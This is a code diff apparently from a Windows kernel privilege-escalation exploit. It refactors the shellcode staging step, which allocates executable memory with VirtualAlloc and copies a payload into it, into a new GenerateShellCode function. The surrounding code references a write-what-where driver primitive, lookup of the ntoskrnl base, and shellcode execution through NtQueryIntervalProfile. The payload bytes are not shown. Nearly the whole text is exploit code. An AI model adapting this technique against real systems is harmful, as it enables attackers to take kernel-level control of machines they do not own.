@@ -49,12 +49,12 @@ struct write_what_where SendToDriver(HANDLE deviceHandle,int IOCode, void* what,
 LPVOID FindBaseAddressOfNtoKrnl();
 HANDLE InitDriver();
 void ShowError();
+void *GenerateShellCode();
 
 int main()
 {
     bool executeSuccess = false;
     void *ptr = NULL;
-    int shellCodeLen=0;
     LPVOID kernelAddress=NULL;
     HANDLE driverHandle=NULL;
 
@@ -62,13 +62,7 @@ int main()
 
     if (driverHandle)
     {
-        shellCodeLen = sizeof(payload);
-
-        ptr = VirtualAlloc(0,shellCodeLen, 0x3000,0x40); 
-
-        RtlMoveMemory(ptr,payload,shellCodeLen);
-
-        printf("[+] Shellcode is located at %p\n", ptr);
+        ptr = GenerateShellCode();
 
         kernelAddress = FindBaseAddressOfNtoKrnl();
 
@@ -296,4 +290,21 @@ bool ExecuteShellcodeByNtQueryIntervalProfile()
         return false;
     }
     return true;
+}
+
+void *GenerateShellCode()
+{
+    void *ptr = NULL;
+    int shellCodeLen=0;
+    
+    shellCodeLen = sizeof(payload);
+
+
+    ptr = VirtualAlloc(0,shellCodeLen, 0x3000,0x40); 
+
+    RtlMoveMemory(ptr,payload,shellCodeLen);
+
+    printf("[+] Shellcode is located at %p\n", ptr);
+
+    return ptr;
 }
